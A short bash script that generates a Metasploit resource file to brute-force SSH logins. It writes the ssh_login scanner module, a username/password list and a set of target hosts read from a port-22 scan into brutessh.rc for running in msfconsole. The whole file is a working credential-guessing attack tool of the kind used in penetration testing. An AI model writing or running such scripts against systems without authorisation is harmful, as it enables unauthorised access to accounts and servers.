#!/bin/bash
# brute_ssh_gen.sh sets up an .rc script to brute force SSH logins with user_pass.txt on multiple hosts
# Prepend 22_scan.txt with the location of user_pass file for brute force
# The file must be in the format:
####### username password #######
# Usage: brute_ssh_gen.sh < hosts/22_scan.txt
# Use the resource script in msfconsole > resource [brutessh.rc]

read -p "Location of user_pass file: " file
echo "use auxiliary/scanner/ssh/ssh_login" > ./rc/brutessh.rc
echo "set USERPASS_FILE $file" >> ./rc/brutessh.rc
echo "set VERBOSE false" >> ./rc/brutessh.rc
echo -n "set RHOSTS" >> ./rc/brutessh.rc
while read -p "Set RHOSTs: " rhost; do
    echo -n " $rhost" >> ./rc/brutessh.rc
done
echo "" >> ./rc/brutessh.rc
echo "run" >> ./rc/brutessh.rc
